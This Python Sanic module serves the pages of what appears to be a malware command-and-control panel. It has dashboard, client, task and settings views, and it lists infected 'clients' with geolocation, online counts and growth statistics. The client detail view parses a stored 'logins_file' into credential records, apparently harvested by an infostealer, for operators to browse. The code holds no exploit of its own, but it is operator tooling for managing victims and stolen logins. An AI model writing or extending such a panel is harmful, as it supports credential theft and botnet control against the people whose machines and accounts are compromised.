from sanic import Blueprint, Request
from sanic_ext import render
from ..authentication import authenticated, get_authenticated_user
from ..premissions import Premissions
from urllib.parse import urlparse
from ..misc import get_uptime, summarize_locations
from ..models import User, Client, SessionLocal, get_new_clients_count_last_24_hours, get_total_clients_count_last_24_hours
import asyncio
import json

ui_bp = Blueprint("ui")

@ui_bp.get("/dashboard")
async def dashboard(request: Request):
    error = authenticated(request)
    if error: return error
    user = get_authenticated_user(request)

    with SessionLocal() as session:
        users = session.query(User).all()
        rawLocations = [ c.to_json()["geoloc"] for c in session.query(Client).all()]

    ipLocations = summarize_locations(rawLocations)

    return await render("dashboard.html.j2", context={
        "active": "dashboard", "user": user.to_json(), "premissions": Premissions.to_json(),
        "ipLocations": ipLocations, "uptime": get_uptime(), "newClientClounts": get_new_clients_count_last_24_hours(), "users": users})

@ui_bp.get("/clients")
async def clients(request: Request):
    error = authenticated(request)
    if error: return error
    user = get_authenticated_user(request)

    with SessionLocal() as session:
        clients = session.query(Client).all()
        clients_json = [ c.to_json() for c in clients]
    
    onlineCount = 0
    for client in clients:
        if client.is_online():
            onlineCount += 1

    return await render("clients.html.j2", context={
        "active": "clients", "user": user.to_json(), "premissions": Premissions.to_json(),
        "clients": clients_json, "onlineClients": onlineCount, "totalClients": len(clients), "clientGroth24h": get_total_clients_count_last_24_hours()})

@ui_bp.get("/client/<id>")
async def client(request: Request, id: int):
    error = authenticated(request)
    if error: return error
    user = get_authenticated_user(request)

    host = request.headers.get("host")
    referer = request.headers.get("referer")

    if not host:
        raise Exception("There was an error when loading this page!")

    back_url = None
    if referer:
        last_url = urlparse(referer)
        if host == last_url.netloc:
            back_url = last_url.path
    
    with SessionLocal() as session:
        client = session.query(Client).filter(Client.id == id).first()
        if not client:
            raise Exception("Invalid client id!")

    logins = []
    for r in client.logins_file.strip().split('\n'):
        logins.append(r.split(' ]|[ '))

    return await render("client.html.j2", context={"active": "BACK", "back_url": back_url, "user": user.to_json(), "premissions": Premissions.to_json(), "client": client.to_json(), "logins": logins})

@ui_bp.get("/tasks")
async def tasks(request: Request):
    error = authenticated(request, permissions=[Premissions.Operator, Premissions.Configurator], redirect_route="/dashboard")
    if error: return error
    user = get_authenticated_user(request)
    return await render("tasks.html.j2", context={"active": "tasks", "user": user.to_json(), "premissions": Premissions.to_json()})

@ui_bp.get("/settings")
async def settings(request: Request):
    error = authenticated(request, permissions=[Premissions.Configurator], redirect_route="/dashboard")
    if error: return error
    user = get_authenticated_user(request)
    return await render("settings.html.j2", context={"active": "settings", "user": user.to_json(), "premissions": Premissions.to_json()})